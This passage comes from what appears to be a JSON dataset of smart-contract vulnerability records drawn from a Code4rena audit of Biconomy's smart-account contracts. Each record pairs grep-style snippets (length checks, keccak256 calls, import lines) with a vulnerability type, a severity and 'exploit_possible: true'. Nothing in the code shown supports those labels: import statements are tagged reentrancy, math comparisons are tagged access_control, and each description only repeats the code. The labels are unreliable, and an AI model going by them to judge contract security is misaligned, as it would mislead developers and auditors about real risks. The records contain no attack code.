{\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::62 => uint256 sigLength = paymasterAndData.length - 20;\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::65 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::37 => @param _ids       An array containing ids of each token being transferred (order and length must match _values array)\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::38 => @param _values    An array containing amounts of each token being transferred (order and length must match _ids array)\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::12 => * @param _data       Arbitrary length data signed on the behalf of address(this)\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::12 => * @param _data Arbitrary length data signed on the behalf of address(this)\ncontracts/smart-contract-wallet/libs/MultiSend.sol::21 => ///                     data length as a uint256 (=> 32 bytes),\ncontracts/smart-contract-wallet/libs/MultiSend.sol::30 => let length := mload(transactions)\ncontracts/smart-contract-wallet/libs/MultiSend.sol::34 => } lt(i, length) {\ncontracts/smart-contract-wallet/libs/MultiSend.sol::48 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\ncontracts/smart-contract-wallet/libs/MultiSend.sol::61 => // Next entry starts at 85 byte + data length\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::14 => ///                     data length as a uint256 (=> 32 bytes),\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::24 => let length := mload(transactions)\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::28 => } lt(i, length) {\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::42 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::56 => // Next entry starts at 85 byte + data length\ncontracts/smart-contract-wallet/libs/Strings.sol::20 => uint256 length = Math.log10(value) + 1;\ncontracts/smart-contract-wallet/libs/Strings.sol::21 => string memory buffer = new string(length);\ncontracts/smart-contract-wallet/libs/Strings.sol::25 => ptr := add(buffer, add(32, length))\ncontracts/smart-contract-wallet/libs/Strings.sol::50 => * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\ncontracts/smart-contract-wallet/libs/Strings.sol::52 => function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\ncontracts/smart-contract-wallet/libs/Strings.sol::53 => bytes memory buffer = new bytes(2 * length + 2);\ncontracts/smart-contract-wallet/libs/Strings.sol::56 => for (uint256 i = 2 * length + 1; i > 1; --i) {\ncontracts/smart-contract-wallet/libs/Strings.sol::60 => require(value == 0, \"Strings: hex length insufficient\");\ncontracts/smart-contract-wallet/libs/Strings.sol::65 => * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::37 => return PaymasterData(paymasterId, signature, signature.length);\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) { contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); contracts/smart-contract-wallet/SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 74,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/SmartAccount.sol::236 => if (refundInfo.gasPrice > 0) {\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::236 => if (refundInfo.gasPrice > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::174 => if (callData.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::178 => if (result.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::212 => if (paymasterAndData.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::452 => if (context.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::61 => require(_unstakeDelaySec > 0, \"must specify unstake delay\");\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::64 => require(stake > 0, \"no stake specified\");\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::99 => require(stake > 0, \"No stake to withdraw\");\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::100 => require(info.withdrawTime > 0, \"must call unlockStake() first\");\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::31 => if (codeSize > 0) {\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::30 => if (codeSize > 0) {\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::16 => * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)\ncontracts/smart-contract-wallet/libs/Math.sol::147 => if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::208 => if (value >> 128 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::212 => if (value >> 64 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::216 => if (value >> 32 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::220 => if (value >> 16 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::224 => if (value >> 8 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::228 => if (value >> 4 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::232 => if (value >> 2 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::236 => if (value >> 1 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::312 => if (value >> 128 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::316 => if (value >> 64 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::320 => if (value >> 32 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::324 => if (value >> 16 > 0) {\ncontracts/smart-contract-wallet/libs/Math.sol::328 => if (value >> 8 > 0) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/SmartAccount.sol::236 => if (refundInfo.gasPrice > 0) { contracts/smart-contract-wallet/SmartAccountNoAuth.sol::236 => if (refundInfo.gasPrice > 0) { contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::174 => if (callData.length > 0) { contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::178 => if (result.length > 0) { contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::212 => if (paymasterAndData.length > 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\ncontracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\ncontracts/smart-contract-wallet/SmartAccount.sol::39 => // keccak256(\ncontracts/smart-contract-wallet/SmartAccount.sol::45 => // keccak256(\ncontracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\ncontracts/smart-contract-wallet/SmartAccount.sol::217 => txHash = keccak256(txHashData);\ncontracts/smart-contract-wallet/SmartAccount.sol::347 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\ncontracts/smart-contract-wallet/SmartAccount.sol::416 => return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\ncontracts/smart-contract-wallet/SmartAccount.sol::430 => keccak256(\ncontracts/smart-contract-wallet/SmartAccount.sol::435 => keccak256(_tx.data),\ncontracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\ncontracts/smart-contract-wallet/SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\ncontracts/smart-contract-wallet/SmartAccountFactory.sol::71 => bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::39 => // keccak256(\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::45 => // keccak256(\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::217 => txHash = keccak256(txHashData);\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::342 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::406 => return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::420 => keccak256(\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::425 => keccak256(_tx.data),\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::197 => return keccak256(abi.encode(userOp.hash(), address(this), block.chainid));\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol::74 => return keccak256(pack(userOp));\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::44 => return Create2.computeAddress(bytes32(salt), keccak256(abi.encodePacked(\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::43 => return Create2.computeAddress(bytes32(salt), keccak256(abi.encodePacked(\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::39 => return keccak256(abi.encode(\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::42 => keccak256(userOp.initCode),\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::43 => keccak256(userOp.callData),\ncontracts/smart-contract-wallet/base/FallbackManager.sol::11 => // keccak256(\"fallback_manager.handler.address\")\ncontracts/smart-contract-wallet/common/Singleton.sol::9 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1 */\ncontracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::11 => This function MUST return `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))` (i.e. 0xf23a6e61) if it accepts the transfer.\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::13 => Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::19 => @return           `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::32 => This function MUST return `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))` (i.e. 0xbc197c81) if it accepts the transfer(s).\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::34 => Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::40 => @return           `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`\ncontracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol::16 => /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::10 => *   > The bytes4 magic value to return when signature is valid is 0x20c13b0b : bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::26 => *   > The bytes4 magic value to return when signature is valid is 0x20c13b0b : bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::28 => * @param _hash       keccak256 hash that was signed\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::5 => // bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::80 => return keccak256(abi.encode(\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::83 => keccak256(userOp.initCode),\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::84 => keccak256(userOp.callData),",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); contracts/smart-contract-wallet/SmartAccount.sol::39 => // keccak256( contracts/smart-contract-wallet/SmartAccount.sol::45 => // keccak256( contracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 45,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "contracts/smart-contract-wallet/BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\";\ncontracts/smart-contract-wallet/BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\ncontracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\ncontracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\ncontracts/smart-contract-wallet/SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/SmartAccount.sol::40 => //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\ncontracts/smart-contract-wallet/SmartAccount.sol::46 => //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\ncontracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\ncontracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\ncontracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\ncontracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::40 => //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::46 => //     \"WalletTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\ncontracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::7 => import \"@openzeppelin/contracts/access/Ownable.sol\";\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::15 => import \"../interfaces/IAggregatedAccount.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::6 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::7 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::9 => import \"@openzeppelin/contracts/access/Ownable.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::102 => require(unlockBlock[msg.sender] != 0 && block.number > unlockBlock[msg.sender], \"DepositPaymaster: must unlockTokenDeposit\");\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::115 => require(oracle != NULL_ORACLE, \"DepositPaymaster: unsupported token\");\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::130 => require(userOp.verificationGasLimit > COST_OF_POST, \"DepositPaymaster: gas too low for postOp\");\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::133 => require(paymasterAndData.length == 20+20, \"DepositPaymaster: paymasterAndData must specify token\");\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::138 => require(unlockBlock[account] == 0, \"DepositPaymaster: deposit not locked\");\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::139 => require(balances[token][account] >= maxTokenCost, \"DepositPaymaster: deposit too low\");\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::8 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::9 => import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::10 => import \"@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::4 => import \"@openzeppelin/contracts/utils/Create2.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::5 => import \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountForTokens.sol::4 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccount.sol::4 => import \"../interfaces/IAggregatedAccount.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::4 => import \"@openzeppelin/contracts/utils/Create2.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::5 => import \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::24 => require(signature.length == 32, \"TestSignatureValidator: sig must be uint\");\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::26 => require(sig == sum, \"TestSignatureValidator: aggregated signature mismatch (nonce sum)\");\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::6 => import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::76 => require(userOp.verificationGasLimit > COST_OF_POST, \"TokenPaymaster: gas too low for postOp\");\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::80 => require(balanceOf(userOp.sender) >= tokenPrefund, \"TokenPaymaster: no balance (pre-create)\");\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::93 => require(factory == theFactory, \"TokenPaymaster: wrong account factory\");\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::7 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::64 => // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::65 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::69 => require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterAndData[20 :]) || tx.origin == address(0), \"VerifyingPaymaster: wrong signature\");\ncontracts/smart-contract-wallet/aa-4337/test/TestCounter.sol::4 => //sample \"receiver\" contract, for testing \"exec\" from account.\ncontracts/smart-contract-wallet/aa-4337/test/TestToken.sol::4 => import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontracts/smart-contract-wallet/common/Singleton.sol::9 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1 */\ncontracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::4 => import \"../interfaces/ERC1155TokenReceiver.sol\";\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::5 => import \"../interfaces/ERC721TokenReceiver.sol\";\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::6 => import \"../interfaces/ERC777TokensRecipient.sol\";\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::11 => This function MUST return `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))` (i.e. 0xf23a6e61) if it accepts the transfer.\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::19 => @return           `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::32 => This function MUST return `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))` (i.e. 0xbc197c81) if it accepts the transfer(s).\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::40 => @return           `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`\ncontracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol::16 => /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\ncontracts/smart-contract-wallet/libs/MultiSend.sol::27 => require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol::7 => import \"@openzeppelin/contracts/access/Ownable.sol\";\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol::8 => import \"@account-abstraction/contracts/interfaces/IPaymaster.sol\";\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::4 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::5 => import \"@account-abstraction/contracts/interfaces/UserOperation.sol\";\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::6 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::7 => import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::8 => import \"@openzeppelin/contracts/utils/Address.sol\";\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::36 => require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::37 => require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::42 => revert(\"Deposit must be for a paymasterId. Use depositFor\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::49 => require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::50 => require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::66 => require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::106 => // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::108 => require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::109 => require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\ncontracts/smart-contract-wallet/test/Button.sol::3 => import \"@openzeppelin/contracts/access/Ownable.sol\";\ncontracts/smart-contract-wallet/test/MockToken.sol::4 => import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontracts/smart-contract-wallet/test/StakedTestToken.sol::4 => import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontracts/smart-contract-wallet/test/StakedTestToken.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Findings:",
